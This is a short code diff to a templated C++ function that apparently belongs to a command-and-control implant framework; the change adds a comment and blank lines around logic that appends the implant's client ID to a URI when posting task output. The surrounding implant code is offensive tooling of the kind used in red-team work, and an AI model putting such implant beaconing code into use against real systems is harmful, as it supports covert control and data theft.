@@ -173,6 +173,8 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     [%- endif %]
 
     [%- if http_post_client_id_terminator == "parameter" %]
+        
+        //POST data stored in parameter [[http_post_client_id_terminator]]
         if (uri.find(L'?') != std::wstring::npos) {
             // URI already has query parameters
             uri += L"&";
@@ -181,6 +183,7 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
             uri += L"?";
         }
         uri += L"[[ http_post_client_id_terminator_value ]]=" + w_id;
+
     [%- endif %]
     
     [# I don't think this is a valid case for malleablec2, id can't go in body iirc #]
